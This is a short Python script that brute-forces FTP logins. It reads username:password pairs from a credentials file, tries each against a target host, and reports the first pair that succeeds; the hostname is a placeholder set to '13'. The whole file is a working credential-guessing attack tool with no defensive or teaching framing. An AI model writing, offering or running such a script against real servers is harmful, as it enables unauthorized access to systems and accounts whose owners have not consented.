import ftplib

def bruteForcelogin(hostname, passwordFile):
    passList = open(passwordFile, 'r')
    for line in passList.readlines():
        username = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print("[+] Trying " + str(username) + "/" + str(passWord))
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username,passWord)
            print("FTP Login Successful " + str(username) + "/" + str(passWord))
            ftp.quit()
            return  (username, passWord)
        except Exception:
            pass


if __name__ == '__main__':
    #type in host ip or server you are trying to log into under "hostname"
            hostname = "13"
            passwordFile  = "credentials.txt"
            bruteForcelogin(hostname, passwordFile)
